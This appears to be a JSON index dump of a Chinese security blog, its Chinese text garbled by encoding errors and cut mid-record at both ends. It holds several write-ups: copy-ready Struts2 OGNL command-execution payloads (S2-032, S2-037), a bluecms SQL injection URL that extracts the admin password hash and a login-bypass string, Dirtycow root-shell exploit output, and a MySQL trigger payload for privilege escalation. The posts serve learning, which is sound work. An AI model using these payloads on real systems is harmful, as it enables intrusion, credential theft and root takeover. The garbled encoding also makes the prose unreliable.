æ‰§è¡Œç³»ç»Ÿå‘½ä»¤1debug=command&amp;expression=%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29%0A Struts2 S2-032å½±å“ç‰ˆæœ¬: 2.3.20 - 2.3.28 (except 2.3.20.3 and 2.3.24.3) æ¼æ´è¯¦æƒ…: https://struts.apache.org/docs/s2-032.html åœ¨é…ç½®äº† Struts2 DMI ä¸º True çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ method: Action å‰ç¼€å»è°ƒç”¨å£°æ˜ä¸º public çš„å‡½æ•°ï¼ŒDMI çš„ç›¸å…³ä½¿ç”¨æ–¹æ³•å¯å‚è€ƒå®˜æ–¹ä»‹ç»ï¼ˆDynamic Method Invocationï¼‰ï¼Œè¿™ä¸ª DMI çš„è°ƒç”¨ç‰¹æ€§å…¶å®ä¸€ç›´å­˜åœ¨ï¼Œåªä¸è¿‡åœ¨ä½ç‰ˆæœ¬ä¸­ Strtus2 ä¸ä¼šå¯¹ name æ–¹æ³•å€¼åš OGNL è®¡ç®—ï¼Œè€Œåœ¨é«˜ç‰ˆæœ¬ä¸­ä¼šï¼Œä»£ç è¯¦æƒ…å¯å‚è€ƒé˜¿å°”æ³•å®éªŒå®¤çš„æŠ¥å‘Š - ã€ŠApache Struts2 s2-032æŠ€æœ¯åˆ†æåŠæ¼æ´æ£€æµ‹è„šæœ¬ã€‹ ä¸Šæ–‡å¼•ç”¨rickgrayçš„æè¿°ã€‚ æ„é€ PoCè·å–webæ ¹ç›®å½•1?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#req=#context.get(#parameters.a[0]),#resp=#context.get(#parameters.b[0]),#resp.setCharacterEncoding(#parameters.c[0]),#ot=#resp.getWriter (),#ot.print(#parameters.e[0]+#req.getSession().getServletContext().getRealPath(#parameters.d[0])),#ot.flush(),#ot.close&amp;a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=UTF-8&amp;d=/&amp;e=webpath: æ‰§è¡Œç³»ç»Ÿå‘½ä»¤1?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#a=(new java.lang.ProcessBuilder(#parameters.a[0])).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(#parameters.b[0]),#matt.getWriter().println(#parameters.c[0]+new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close&amp;a=whoami&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=flag: Struts2 S2-037å½±å“ç‰ˆæœ¬: 2.3.20 - 2.3.28.1 æ¼æ´è¯¦æƒ…: http://struts.apache.org/docs/s2-037.html è¿™ä¸ªæ¼æ´å’Œä¹‹å‰S2-032/033æ˜¯ä¸€ä¸ªåœ°æ–¹ï¼Œéƒ½æ˜¯åœ¨DefaultActionInvocation.javaçš„invokeActionæ–¹æ³•ä¸­æ²¡æœ‰å¯¹äºmethodNameå‚æ•°å†…å®¹è¿›è¡Œæ ¡éªŒï¼Œä¾¿ç›´æ¥ä¸¢åˆ°äº†getValueæ–¹æ³•é‡Œé¢ï¼Œä»è€Œé€ æˆOnglè¡¨è¾¾å¼çš„æ³¨å…¥ã€‚ ä¸Šæ–‡å¼•ç”¨nsfocus%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html)çš„æè¿° æ„é€ PoCè·å–webæ ¹ç›®å½•1/(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#req=#context.get(#parameters.a[0]),#resp=#context.get(#parameters.b[0]),#resp.setCharacterEncoding(#parameters.c[0]),#ot=#resp.getWriter (),#ot.print(#parameters.e[0]+#req.getSession().getServletContext().getRealPath(#parameters.d[0])),#ot.flush(),#ot.close):xx.toString.json?&amp;a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=UTF-8&amp;d=/&amp;e=webpath: æ‰§è¡Œç³»ç»Ÿå‘½ä»¤1/(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#a=(new java.lang.ProcessBuilder(#parameters.a[0])).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(#parameters.b[0]),#matt.getWriter().println(#parameters.c[0]+new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()):xx.toString.json?&amp;a=whoami&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=flag: æ€»ç»“Struts2å‘½ä»¤æ‰§è¡Œç®—æ˜¯ä¸€ä¸ªæ¯”è¾ƒç»å…¸çš„æ¼æ´äº†ï¼Œå¸Œæœ›ä»¥åæ·±å…¥javaçš„ä¸€äº›æ¡†æ¶ï¼Œå¯ä»¥ä»åº•å±‚æ¥åˆ†æï¼šï¼‰"},{"title":"ã€Code Reviewã€‘bluecms v1.6 Sql Injection åˆ†æ","permalink":"http://blog.0kami.cn/2017/01/11/old-bluecms-v1-6-Sql-Injection/","text":"æ¦‚è¿°å¾ˆä¹…æ²¡æœ‰ä»£ç å®¡è®¡äº†ï¼Œæ‹¿ä¸€å¥—ç®€å•çš„æ‰¾æ‰¾æ„Ÿè§‰ã€‚bluecmsæ˜¯ä¸€å¥—æ¯”è¾ƒè€çš„é—¨æˆ·ç½‘ç«™cmsï¼Œç½‘ä¸Šä¹Ÿæœ‰å¾ˆå¤šå…³äºå®ƒçš„æ¼æ´è¿˜æœªä¿®è¡¥ï¼Œæ‰€ä»¥ä¸‹æ–‡çš„æ¼æ´ä¹Ÿä¸ç®—æ˜¯æœ€æ–°çš„ï¼Œä»…å½“æ˜¯ç»ƒç»ƒæ‰‹ã€‚ SQLæ³¨å…¥åˆ†æé¦–å…ˆå…³æ³¨ä¸€ä¸‹æ•°æ®çš„è¾“å…¥ å…¨å±€æ•°æ®è½¬ä¹‰åœ¨common.inc.phpä¸­ 1234567if(!get_magic_quotes_gpc())&#123; $_POST = deep_addslashes($_POST); $_GET = deep_addslashes($_GET); $_COOKIES = deep_addslashes($_COOKIES); $_REQUEST = deep_addslashes($_REQUEST);&#125; å†è·Ÿè¿›ä¸€ä¸‹deep_addslashes 123456789101112131415function deep_addslashes($str)&#123; if(is_array($str)) &#123; foreach($str as $key=&gt;$val) &#123; $str[$key] = deep_addslashes($val); &#125; &#125; else &#123; $str = addslashes($str); &#125; return $str;&#125; å¯ä»¥å‘ç°å¯¹æ•°æ®çš„æ³¨å…¥ï¼Œè¿›è¡Œäº†åŠ æ–œæ è½¬ä¹‰çš„æ“ä½œã€‚é‚£ä¹ˆæ¥ä¸‹æ¥æ‰¾æ³¨å…¥æ€è·¯ä¸»è¦æœ‰ä»¥ä¸‹3ç‚¹ï¼š æ‰¾æ•´æ•°å‹æ³¨å…¥ æ•´å¥—cmsé»˜è®¤gb2312ç¼–ç ï¼Œå®¹æ˜“é€ æˆå®½å­—èŠ‚æ³¨å…¥ httpå¤´å¹¶ä¸åœ¨è½¬ä¹‰çš„èŒƒå›´å†…ï¼Œæ‰€ä»¥ç±»ä¼¼å­˜å…¥ipï¼Œrefferçš„ä½ç½®ä¹Ÿèƒ½å‘ç”Ÿæ³¨å…¥ æ•´æ•°å‹æ³¨å…¥æ‹¿grepåŒ¹é…äº†ä¸€ä¸‹$_GETï¼Œæ‰¾åˆ°ä¸€å¤„ä¸åšå…¶ä»–è¿‡æ»¤çš„æ•´æ•°å‹ä½ç½® 1./ad_js.php:$ad_id = !empty($_GET[&apos;ad_id&apos;]) ? trim($_GET[&apos;ad_id&apos;]) : &apos;&apos;; è·Ÿè¿›ad_js.php 12345678$ad_id = !empty($_GET[&apos;ad_id&apos;]) ? trim($_GET[&apos;ad_id&apos;]) : &apos;&apos;;if(empty($ad_id))&#123; echo &apos;Error!&apos;; exit();&#125;$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&apos;ad&apos;).&quot; WHERE ad_id =&quot;.$ad_id); getoneå‡½æ•° 12345function getone($sql, $type=MYSQL_ASSOC)&#123; $query = $this-&gt;query($sql,$this-&gt;linkid); $row = mysql_fetch_array($query, $type); return $row;&#125; å¯ä»¥çœ‹åˆ°è¿™é‡Œå¯¹ad_idæ²¡æœ‰åšå…¶ä»–è¿‡æ»¤å¤„ç†ï¼Œé€ æˆäº†æ•´æ•°å‹æ³¨å…¥,ç”±äºåé¢ä¼šå°†ad_contentæ‰“å°åœ¨é¡µé¢ä¸Šï¼Œæ‰€ä»¥ç›´æ¥ç”¨unionæ³¨å…¥å°±å¯ä»¥è·å¾—æ•°æ®ï¼Œæ„é€ payload 1/ad_js.php?ad_id=1%20union%20select%201,2,3,4,5,6,concat(admin_name,0x23,pwd)%20from%20blue_admin%20limit%201 ç»“æœå¯ä»¥åœ¨è¿”å›çš„ç•Œé¢ä¸­çœ‹åˆ° 123&lt;!--document.write(&quot;admin#21232f297a57a5a743894a0e4a801fc3&quot;);--&gt; ps:å› ä¸ºè¯¥cmsé”™è¯¯å›æ˜¾å…·ä½“sqlè¯­å¥ï¼Œè¡¨å‰ç¼€å¯ä»¥é€šè¿‡æŠ¥é”™çš„æ–¹æ³•æŠŠè¡¨å‰ç¼€çˆ†å‡ºæ¥ã€‚ å®½å­—èŠ‚æ³¨å…¥bluecmsæ“ä½œæ•°æ®åº“çš„å…·ä½“ç±»å®šä¹‰åœ¨mysql.class.php,é»˜è®¤è¿æ¥æ—¶çš„ç¼–ç ä¸ºgbkï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“å½“æ•°æ®åº“è¿æ¥æ—¶çš„ç¼–ç ä¸ºgbkç­‰åŒå­—èŠ‚ç¼–ç æ—¶ï¼Œå®¹æ˜“å‘ç”Ÿå®½å­—èŠ‚æ³¨å…¥ã€‚å‰é¢æåˆ°è¯¥å¥—cmså¯¹æ•°æ®è¾“å…¥è¿›è¡Œäº†è½¬ä¹‰çš„æ“ä½œï¼Œé‚£ä¹ˆåˆšåˆšå¥½æ¡ä»¶éƒ½é½äº†ï¼Œå¿…ç„¶å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ã€‚grepçœ‹äº†ä¸€ä¸‹ï¼ŒåŸºæœ¬ä¸Šçš„å­—ç¬¦ä¸²éƒ½åªæ˜¯åšäº†è½¬ä¹‰å¤„ç†ï¼Œæ‰€ä»¥å­—ç¬¦ä¸²æ•°æ®è¾“å…¥ç‚¹éƒ½å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ã€‚å¤§å¤šæ•°æ³¨å…¥éƒ½æ˜¯ç›²æ³¨ï¼Œæ²¡æ‰¾åˆ°å…·ä½“å¯ä»¥ä¼šæ˜¾æ•°æ®çš„åœ°æ–¹ï¼Œè¿™é‡Œå°±ç®€å•çœ‹ä¸€ä¸‹ç™»é™†å¤„ åå°ç™»å½•å¤„å…¶å®å‰å°user.phpï¼Œä¹Ÿå­˜åœ¨æ³¨å…¥ï¼Œåªæ˜¯ç›²æ³¨ï¼Œè¿™é‡Œå°±å–ç®€å•çš„åå°ç™»å½•éªŒè¯å¤„admin/login.php 12345678910111213141516171819202122elseif($act == &apos;do_login&apos;)&#123; $admin_name = isset($_POST[&apos;admin_name&apos;]) ? trim($_POST[&apos;admin_name&apos;]) : &apos;&apos;; $admin_pwd = isset($_POST[&apos;admin_pwd&apos;]) ? trim($_POST[&apos;admin_pwd&apos;]) : &apos;&apos;; $remember = isset($_POST) ? intval($_POST[&apos;rememberme&apos;]) : 0; if($admin_name == &apos;&apos;)&#123; showmsg(&apos;xxx&apos;); &#125; if($admin_pwd == &apos;&apos;)&#123; showmsg(&apos;xxx&apos;); &#125; if(check_admin($admin_name, $admin_pwd))&#123; update_admin_info($admin_name); if($remember == 1)&#123; setcookie(&apos;Blue[admin_id]&apos;, $_SESSION[&apos;admin_id&apos;], time()+86400); setcookie(&apos;Blue[admin_name]&apos;, $admin_name, time()+86400); setcookie(&apos;Blue[admin_pwd]&apos;, md5(md5($admin_pwd).$_CFG[&apos;cookie_hash&apos;]), time()+86400); &#125; &#125;else&#123; showmsg(&apos;xxx&apos;); &#125; showmsg(&apos;xxx&apos;, &apos;index.php&apos;); &#125; ç»§ç»­è·Ÿè¿›check_admin 12345678910111213function check_admin($name, $pwd)&#123; global $db; $row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&apos;admin&apos;).&quot; WHERE admin_name=&apos;$name&apos; and pwd = md5(&apos;$pwd&apos;)&quot;); if($row[&apos;num&apos;] &gt; 0) &#123; return true; &#125; else &#123; return false; &#125;&#125; å¯ä»¥çœ‹åˆ°è¿™é‡Œå‘ç”Ÿäº†ä¸€æ¬¡ç™»é™†éªŒè¯ï¼Œå¯ä»¥é€šè¿‡å®½å­—èŠ‚æ³¨å…¥æ¥åšä¸‡èƒ½å¯†ç ç™»é™†ã€‚ 1user_name=admin%65%27+or+1%3D1%23&amp;pwd=123 å­˜å…¥ipé€ æˆæ³¨å…¥åœ¨common.inc.phpä¸­å¯ä»¥æ‰¾åˆ°getip()å‡½æ•° 12345678910111213141516171819202122232425262728function getip()&#123; if (getenv(&apos;HTTP_CLIENT_IP&apos;)) &#123; $ip = getenv(&apos;HTTP_CLIENT_IP&apos;); &#125; elseif (getenv(&apos;HTTP_X_FORWARDED_FOR&apos;)) &#123; $ip = getenv(&apos;HTTP_X_FORWARDED_FOR&apos;); &#125; elseif (getenv(&apos;HTTP_X_FORWARDED&apos;)) &#123; $ip = getenv(&apos;HTTP_X_FORWARDED&apos;); &#125; elseif (getenv(&apos;HTTP_FORWARDED_FOR&apos;)) &#123; $ip = getenv(&apos;HTTP_FORWARDED_FOR&apos;); &#125; elseif (getenv(&apos;HTTP_FORWARDED&apos;)) &#123; $ip = getenv(&apos;HTTP_FORWARDED&apos;); &#125; else &#123; $ip = $_SERVER[&apos;REMOTE_ADDR&apos;]; &#125; return $ip;&#125; å†çœ‹çœ‹è°ƒç”¨ä»–çš„ä½ç½® online_ipè°ƒç”¨å¤„ çœ‹çœ‹guest_book.phpå¤„å­˜åœ¨insertæ³¨å…¥ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡è¦†ç›–åé¢çš„contentï¼Œé€ æˆæ•°æ®å›æ˜¾ã€‚é€šè¿‡xffä¼ å…¥æ³¨å…¥è¯­å¥æˆ–è€…client ipä¼ å…¥ã€‚ ç»“æœå¯ä»¥çœ‹åˆ° å…¶ä»–ä½ç½®çš„æ³¨å…¥ï¼Œä¸èƒ½å›æ˜¾ï¼Œå°±ä¸åˆ†æäº†ã€‚ æ€»ç»“æ€»ä½“æ¥è¯´ï¼Œç›´æ¥å¯ä»¥grepåˆ°$_GETã€$_POSTã€$_REQUESTçš„cmsï¼Œå®¡è®¡èµ·æ¥ä¼šæ¯”è¾ƒè½»æ¾ã€‚å¯ä»¥å…ˆä»å…¥å£çœ‹èµ·ï¼Œå°†common,configç­‰æ–‡ä»¶çœ‹ä¸€éï¼Œå†æŸ¥æ‰¾å±é™©å‡½æ•°ï¼Œæ•°æ®å…¥å£å°±å¯å®¡è®¡å‡ºå‡ ä¸ªæ¼æ´æ¥ã€‚bluecmsæš‚æ—¶å®¡è®¡åˆ°è¿™ä¸€æ­¥ï¼Œä¸»è¦æ‰¾çš„æ˜¯SQLæ³¨å…¥çš„æ¼æ´ã€‚å…¶ä»–æ¼æ´æ‰“ç®—å‡†å¤‡å¦å¤–ä¸€å¥—cmsæ¥å®¡è®¡:)"},{"title":"ã€VULNERABLITYã€‘æ–‡ä»¶åŒ…å«æ¼æ´è¯¦è§£","permalink":"http://blog.0kami.cn/2016/12/19/old-file-include/","text":"æ¦‚è¿°å¾ˆä¹…æ²¡æœ‰å½’çº³æ€»ç»“çŸ¥è¯†ç‚¹äº†ï¼Œå­¦äº†é‚£ä¹ˆå¤šæ€»æ„Ÿè§‰é‚£ä¹ˆé›¶æ•£ï¼Œæ‰€ä»¥å‡†å¤‡å¼€å§‹æ€»ç»“è¿™ä¸€ç³»åˆ—çš„æ¼æ´è¯¦è§£ã€‚ä¸€æ–¹é¢æ˜¯æ€»ç»“ä¸€æ–¹é¢ä¹Ÿæ˜¯å¤ä¹ ã€‚è¿™ç¯‡ä¸»è¦æ€»ç»“ä¸€ä¸‹æ–‡ä»¶åŒ…å«æ¼æ´ã€‚ æ–‡ä»¶åŒ…å«æ¼æ´ç”±äºåœ¨Webåº”ç”¨å¼€å‘çš„è¿‡ç¨‹ä¸­ï¼Œå¤§é‡ä»£ç æ˜¯å¯ä»¥é‡å¤ä½¿ç”¨çš„ï¼Œä¸ºäº†æ–¹ä¾¿ä½¿ç”¨ç»“åˆå¼€å‘è¯­è¨€(å¦‚php)çš„ä¾¿åˆ©ï¼ŒåŒ…å«é‡å¤åˆ©ç”¨çš„ä»£ç ï¼Œå¦‚æœåœ¨åŒ…å«è¿‡ç¨‹ä¸­ï¼Œè·¯å¾„æˆ–è¯·æ±‚çš„urlå¯æ§ä¸”æ²¡æœ‰åšä»»ä½•çš„å®‰å…¨å¤„ç†ï¼Œå°±å®¹æ˜“å‘ç”Ÿæ–‡ä»¶åŒ…å«æ¼æ´ã€‚æ–‡ä»¶åŒ…å«æ¼æ´åŒ…æ‹¬ æœ¬åœ°æ–‡ä»¶åŒ…å« è¿œç¨‹æ–‡ä»¶åŒ…å« ä¸‹é¢ä¸»è¦è®²çš„æ–‡ä»¶åŒ…å«åœ¨phpä¸­çš„åº”ç”¨ï¼Œæ¯•ç«Ÿphpæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼Œ23333333ps:å…¶ä»–è¯­è¨€ï¼Œé‡åˆ°äº†å†è¡¥å…… è¿œç¨‹æ–‡ä»¶åŒ…å«è¿™é‡Œå…ˆè®²ä¸€ä¸‹è¿œç¨‹æ–‡ä»¶åŒ…å«RFIï¼ˆRemote File Includeï¼‰ï¼Œé¡¾åæ€ä¹‰ï¼Œè¿œç¨‹æ–‡ä»¶åŒ…å«å°±æ˜¯ï¼ŒWebåº”ç”¨ç¨‹åºè¯·æ±‚è¿œç¨‹çš„èµ„æºï¼Œè¿›è¡Œä¸€ä¸ªåŒ…å«åˆ©ç”¨ã€‚ä¸€äº›çŒ¥ççš„è¿‡é©¬ä¸€å¥è¯æœ¨é©¬å°±æ˜¯åˆ©ç”¨è¿™ç§æ–¹å¼è¿›è¡Œä¸€ä¸ªæ¶æ„ä»£ç çš„åŒ…å«ã€‚åœ¨phpä¸­é€ æˆè¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œé¦–å…ˆéœ€è¦é…ç½®æ–‡ä»¶ä¸­allow_url_include=Oné»˜è®¤ä¸å¼€å¯ï¼Œä»¥åŠè¿œç¨‹è¯»å–æ–‡ä»¶allow_url_fopen=Onï¼Œæ»¡è¶³è¿™äº›æ¡ä»¶ï¼Œæˆ‘ä»¬å†æ¥çœ‹çœ‹æœ‰å“ªäº›è§¦å‘è¿œç¨‹æ–‡ä»¶åŒ…å«çš„phpå‡½æ•°ã€‚12345678910//è¯»å–è¿œç¨‹æ–‡ä»¶å†…å®¹fopen()copy()file_get_content()//åŒ…å«è¿œç¨‹æ–‡ä»¶ä»£ç include()include_once()require()require_once()//å¯èƒ½ä¼šæœ‰é—æ¼ï¼Œå°ä¼™ä¼´å¦‚æœçŸ¥é“è¿˜æœ‰å…¶ä»–çš„å¯ä»¥emailæˆ‘ï¼šï¼‰ å‰é¢è¯»å–è¿œç¨‹æ–‡ä»¶å†…å®¹ï¼Œå¯èƒ½ä¼šå‡ºç°åœ¨ä¸Šä¼ å¤´åƒå¤„ï¼Œå­˜å–è¿œç¨‹å¤´åƒã€‚åè€…å±å®³å¯èƒ½æ›´å¤§ï¼Œç›´æ¥åŒ…å«æ¶æ„ä»£ç æ‰§è¡Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚ è¿œç¨‹åŒ…å«æ”¯æŒçš„åè®®åœ¨æ»¡è¶³é…ç½®æ–‡ä»¶çš„è¦æ±‚ä¸‹ï¼Œä½¿ç”¨phpæ”¯æŒä½¿ç”¨httpã€https(å­˜åœ¨opensslæ‰©å±•æ—¶)ã€ftpã€php://inputã€"},{"title":"ã€CVE-2016-5195ã€‘Dirtycow","permalink":"http://blog.0kami.cn/2016/10/26/old-dirtycow-cve-2016-5195/","text":"æ¦‚è¿°æœ€è¿‘å‡ºæ¥çš„dirtycowï¼Œå½±å“ç‰ˆæœ¬:Linux kernel &gt;= 2.6.22ï¼ˆ2007å¹´å‘è¡Œï¼Œåˆ°ä»Šå¹´10æœˆ18æ—¥æ‰ä¿®å¤ï¼‰,ç”¨ç½‘ä¸Šçš„EXPè¯•äº†ä¸€ä¸‹ï¼Œè®°å½•ä¸€ä¸‹è¿‡ç¨‹ EXPhttps://www.exploit-db.com/exploits/40616/è¿™ä¸ªEXPæ˜¯exploitdbä¸Šçš„ï¼Œä½†æ˜¯å®¹æ˜“é€ æˆç³»ç»Ÿå´©æºƒï¼ŒæˆåŠŸåä¼šè¿”å›ä¸€ä¸ªrootæƒé™çš„shell 123456789101112131415okami@ubuntu14:~$ ./dirtycowDirtyCow root privilege escalationBacking up /usr/bin/passwd.. to /tmp/bakSize of binary: 47032Racing, this may take a while..thread stoppedthread stopped/usr/bin/passwd is overwrittenPopping root shell.Don&apos;t forget to restore /tmp/bakroot@ubuntu14:/home/okami# iduid=0(root) gid=1000(okami) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare),1000(okami)root@ubuntu14:/home/okami# whoamirootroot@ubuntu14:/home/okami# https://github.com/scumjr/dirtycow-vdsoè¿™ä¸ªEXPä¸ä¼šå‡ºç°ç³»ç»Ÿå´©æºƒï¼Œä½†æ˜¯ä½œè€…æœ¬äººè¯´ä¸é€‚ç”¨äºæ‰€æœ‰linuxç‰ˆæœ¬ï¼Œä¸è¿‡è¯•éªŒäº†ä¸€ä¸‹ï¼Œubuntu14 16 centOS7éƒ½å¯ä»¥123456789101112131415161718192021okami@ubuntu14:~$ ./0xdeadbeef[*] exploit: patch 1/2[*] vdso successfully backdoored[*] exploit: patch 2/2[*] vdso successfully backdoored[*] waiting for reverse connect shell...[*] enjoy![*] restore: patch 2/2[*] vdso successfully restored[*] restore: patch 1/2[*] vdso successfully restorediduid=0(root) gid=0(root) groups=0(root)whoamirootlsb_release -aNo LSB modules are available.Distributor ID: UbuntuDescription: Ubuntu 14.04.5 LTSRelease: 14.04Codename: trusty æ³¨æ„è¿™é‡Œæœ‰ä¸€æ­¥æ˜¯waiting for reverse connect shellâ€¦ï¼Œéœ€è¦ä¸€ç‚¹æ—¶é—´ï¼ŒæˆåŠŸåæœ‰rootæƒé™çš„shell"},{"title":"ã€CVE-2016-6662ã€‘MYSQLææƒåˆ†æ","permalink":"http://blog.0kami.cn/2016/09/18/old-cve-2016-6663-mysql-exp/","text":"æ¦‚è¿°å‡ å¤©å‰å‡ºäº†mysqlæœ¬åœ°ææƒçš„0dayï¼Œè™½ç„¶ç°åœ¨å®˜æ–¹å·²ç»å‡ºäº†è¡¥ä¸ï¼Œä½†æ˜¯å—å½±å“çš„ä¸»æœºè¿˜æ˜¯æŒºå¤šçš„ã€‚è·Ÿè¿›æ“ä½œä¸€éï¼šï¼‰ æ¼æ´å½±å“1234567MySQL &lt;= 5.7.15 è¿œç¨‹ä»£ç æ‰§è¡Œ/ ææƒ (0day) 5.6.33 5.5.52Mysqlåˆ†æ”¯çš„ç‰ˆæœ¬ä¹Ÿå—å½±å“,åŒ…æ‹¬ï¼š MariaDB PerconaDB å®éªŒåˆ†æè¿™æ¬¡å®éªŒä¸»è¦ä½¿ç”¨dockeræ­å»ºç¯å¢ƒï¼Œæœ‰éœ€è¦çš„åŒå­¦å¯ä»¥pullæˆ‘çš„åº“ç©0kami/vulenv:cve-2016-6663å®éªŒä¸»è¦ä»attackerçš„è§’åº¦å…¥æ‰‹ï¼Œé¢„å…ˆæ‹¥æœ‰çš„æƒé™ï¼š1234mysql è´¦æˆ·æ‹¥æœ‰fileæƒé™ bob/bobexp mysql_hookandroot_lib.cmysql-server-5.6my.cnfå¯è¢«mysqlç»„æ”¹å†™å†™ å…ˆæŸ¥çœ‹ä¸€ä¸‹ç‰ˆæœ¬ä¿¡æ¯å°†/etc/mysql/my.cnfæƒé™ä¿®æ”¹æ‰åˆ›å»ºbobç”¨æˆ·ï¼Œå¹¶èµ‹äºˆfileï¼Œselectï¼Œinsertæƒé™ï¼Œåˆ›å»ºç”¨äºå®éªŒçš„æ•°æ®åº“activedbå’Œè¡¨active_tableå°†expå…ˆå†™å…¥tmpç›®å½•ï¼Œå¹¶ç¼–è¯‘æˆsoæ–‡ä»¶ï¼Œéœ€è¦ä¿®æ”¹ä¸€ä¸‹ipï¼Œportå’Œmy.cnfçš„ä½ç½®gcc -Wall -fPIC -shared -o mysql_hookandroot_lib.c.so mysql_hookandroot_lib.c.c -ldlæœ€åä¸€æ­¥å°±æ˜¯å‡†å¤‡ä¸€ä¸‹active_tableçš„è§¦å‘å™¨äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç°åœ¨è‡ªå·±ç”µè„‘ä¸Šrootç”¨æˆ·æƒé™ä¸‹ç”Ÿæˆä¸€ä¸ªtraggeråœ¨activedbæ•°æ®ä¸‹ä¼šç”Ÿæˆä¸€ä¸ªè§¦å‘å™¨åˆ°æ­¤ä½ç½®æˆ‘ä»¬æ‰€æœ‰çš„å‡†å¤‡å·¥ä½œéƒ½åšå¥½äº†ã€‚è®©æˆ‘ä»¬ç”¨bobç”¨æˆ·æ¥å¼¹ä¸ªshellå§1select &quot;TYPE=TRIGGERS\\ntriggers=&apos;CREATE DEFINER=`root`@`localhost` TRIGGER active_table\\nAFTER INSERT\\n ON `active_table` FOR EACH ROW\\nBEGIN\\n DECLARE void varchar(550);\\n set global general_log_file=\\\\\\&apos;/etc/mysql/my.cnf\\\\\\&apos;;\\n set global general_log = on;\\n select \\&quot;\\n[mysqld]\\nmalloc_lib=\\\\\\&apos;/tmp/mysql_hookandroot_lib.so\\\\\\&apos;\\n\\&quot; INTO void; \\n set global general_log = off;\\nEND&apos;\\nsql_modes=1073741824\\ndefiners=&apos;root@localhost&apos;\\nclient_cs_names=&apos;latin1&apos;\\nconnection_cl_names=&apos;latin1_swedish_ci&apos;\\ndb_cl_names=&apos;latin1_swedish_ci&apos;&quot; into dumpfile &apos;/var/lib/mysql/activedb/active_table.TRG&apos;; ç”¨bobçš„ç”¨æˆ·å†™å…¥æ–‡ä»¶äº§ç”Ÿä¸€ä¸ªè§¦å‘å™¨ï¼Œè¿™ä¸ªè§¦å‘å™¨å½“äº§ç”Ÿinsertæ—¶è§¦å‘æ¥æŸ¥çœ‹ä¸€ä¸‹ï¼Œæ‰§è¡Œåçš„/etc/mysql/my.cnfçš„å†…å®¹é‡å¯ä¸€ä¸‹æ•°æ®åº“ï¼Œåå¼¹ä¸€ä¸ªshellå‘ç°å¯å†™çš„my.cnfä¼šè¢«å¿½ç•¥ï¼Ÿï¼Ÿï¼Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼ˆéš¾é“æ‰“è¡¥ä¸äº†ï¼Ÿï¼‰ï¼Œä¸çŸ¥é“5.5çš„æƒ…å†µä¼šæ€ä¹ˆæ ·ï¼Œæ‰€ä»¥å…ˆæŠŠmy.cnfçš„æƒé™æ”¹å›æ¥744æˆåŠŸåå¼¹ä¸€ä¸ªshellï¼Œè¿™è¾¹è¿”å›çš„ä¸€ä¸ªshellæ˜¯mysqlæƒé™çš„ æ˜¯å› ä¸ºæˆ‘æµ‹è¯•çš„ç¯å¢ƒmysqld_safeæ˜¯ä»¥mysqlæƒé™è¿è¡Œçš„ï¼Œæ‰€ä»¥å¼¹å‡ºæ¥çš„æƒé™æ˜¯mysqlçš„ï¼Œä½†æ˜¯å¦‚æœmysqld_safeæ˜¯ä»¥rootæƒé™è¿è¡Œï¼Œé‚£ä¹ˆåå¼¹çš„shellå°±æ˜¯rootæƒé™çš„ï¼Œé€ æˆææƒã€‚ æ€»ç»“æµ‹è¯•ç¯å¢ƒæ­å»ºè¿˜æœ‰åˆ©ç”¨è¿‡ç¨‹è¿˜æ˜¯å‡ºç°äº†å¾ˆå¤šé—®é¢˜ï¼Œå¯å†™çš„my.cnfä¼šè¢«å¿½ç•¥è½½å…¥ï¼ˆä¸çŸ¥é“æ˜¯ä¸æ˜¯å› ä¸ºä¿®å¤è¿‡çš„åŸå› ï¼‰ï¼Œtriggersçš„åˆ©ç”¨ï¼ˆå¯ä»¥åŒæ ·åˆ©ç”¨åœ¨æ‹¥æœ‰fileæƒé™çš„æƒ…å†µä¸‹æå‡æƒé™ï¼Œè¿™ä¸ªåˆ°æ—¶å€™å†æ·±å…¥å­¦ä¹ ä¸€ä¸‹ï¼‰"},{"title":"ã€VULNERABLITYã€‘python sandbox 